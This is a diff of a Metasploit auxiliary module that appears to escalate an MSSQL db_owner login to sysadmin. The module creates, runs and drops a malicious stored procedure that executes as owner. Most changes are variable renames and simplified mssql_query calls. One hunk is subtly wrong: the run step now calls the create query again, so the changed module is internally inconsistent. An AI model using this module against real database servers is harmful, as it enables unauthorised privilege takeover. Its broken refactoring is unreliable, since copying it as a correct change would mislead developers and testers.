@@ -77,8 +77,8 @@ class Metasploit3 < Msf::Auxiliary
     escalate_status = escalate_privs(dbowner_status)
     if escalate_status == 1
       # Check if escalation was successful
-      mystatus = check_sysadmin
-      if mystatus == 1
+      user_status = check_sysadmin
+      if user_status == 1
         print_good("Congrats, #{datastore['username']} is now a sysadmin!.")
       else
         print_error("Fail buckets, something went wrong.")
@@ -97,7 +97,7 @@ class Metasploit3 < Msf::Auxiliary
     sql = "select is_srvrolemember('sysadmin') as IsSysAdmin"
 
     # Run query
-    result = mssql_query(sql, false)
+    result = mssql_query(sql)
 
     # Parse query results
     parse_results = result[:rows]
@@ -120,7 +120,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       # Run query
-      result = mssql_query(sql, false)
+      result = mssql_query(sql)
     rescue
       # Return on fail
       return 0
@@ -148,7 +148,7 @@ class Metasploit3 < Msf::Auxiliary
       where rp.name = 'db_owner' and mp.name = SYSTEM_USER"
 
       # Run query
-      result = mssql_query(sql, false)
+      result = mssql_query(sql)
 
       begin
         # Parse query results
@@ -168,7 +168,7 @@ class Metasploit3 < Msf::Auxiliary
   def escalate_privs(dbowner_db)
     # Create the evil stored procedure WITH EXECUTE AS OWNER
     # Setup query
-    evilsql_create = "use #{dbowner_db};
+    evil_sql_create = "use #{dbowner_db};
     DECLARE @myevil as varchar(max)
     set @myevil = '
     CREATE PROCEDURE sp_elevate_me
@@ -182,7 +182,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       # Run query
-      mssql_query(evilsql_create, false)
+      mssql_query(evil_sql_create)
     rescue
       # Return error
       error = 'Failed to create stored procedure.'
@@ -198,7 +198,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       # Run query
-      mssql_query(evilsql_run, false)
+      mssql_query(evil_sql_create)
     rescue
       # Return error
       error = 'Failed to run stored procedure.'
@@ -214,7 +214,7 @@ class Metasploit3 < Msf::Auxiliary
 
     begin
       # Run query
-      mssql_query(evilsql_remove, false)
+      mssql_query(evilsql_remove)
 
       # Return value
       return 1
